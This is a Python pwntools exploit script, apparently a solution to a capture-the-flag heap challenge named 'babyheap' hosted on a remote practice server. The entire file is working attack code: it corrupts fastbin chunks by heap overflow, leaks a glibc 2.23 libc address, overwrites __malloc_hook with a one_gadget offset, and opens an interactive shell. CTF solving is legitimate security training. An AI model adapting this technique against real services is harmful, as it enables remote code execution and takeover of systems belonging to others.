from pwn import *

# p = process('./babyheap')
p = remote('node4.buuoj.cn', 28080)
elf = ELF('./babyheap')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')


def add(size_):
    p.recvuntil(b'Command:')
    p.sendline(b'1')
    p.recvuntil(b'Size:')
    p.sendline(size_)


def edit(id_, size_, mess):
    p.recvuntil(b'Command:')
    p.sendline(b'2')
    p.recvuntil(b'Index:')
    p.sendline(id_)
    p.recvuntil(b'Size:')
    p.sendline(size_)
    p.recvuntil(b'Content:')
    p.send(mess)


def delete(id_):
    p.recvuntil(b'Command:')
    p.sendline(b'3')
    p.recvuntil(b'Index:')
    p.sendline(id_)


def show(id_):
    p.recvuntil(b'Command:')
    p.sendline(b'4')
    p.recvuntil(b'Index:')
    p.sendline(id_)


add(b'16')
add(b'16')
add(b'16')
add(b'16')
add(b'128')
delete(b'1')
delete(b'2')
payload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)
edit(b'0', b'65', payload)
payload = p64(0) * 3 + p64(0x21)
edit(b'3', b'32', payload)
add(b'16')
add(b'16')
payload = p64(0) * 3 + p64(0x91)
add(b'128')
edit(b'3', b'32', payload)
delete(b'4')
show(b'2')
hook_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 88 - 16
print(hex(hook_addr))
libc_base = hook_addr - lib.symbols['__malloc_hook']
add(b'96')
delete(b'4')
payload = p64(hook_addr - 35)
edit(b'2', b'8', payload)
add(b'96')
add(b'96')
payload = b'a' * 19 + p64(libc_base + 0x4526a)
edit(b'6', b'27', payload)
add(b'100')
# gdb.attach(p)
p.interactive()
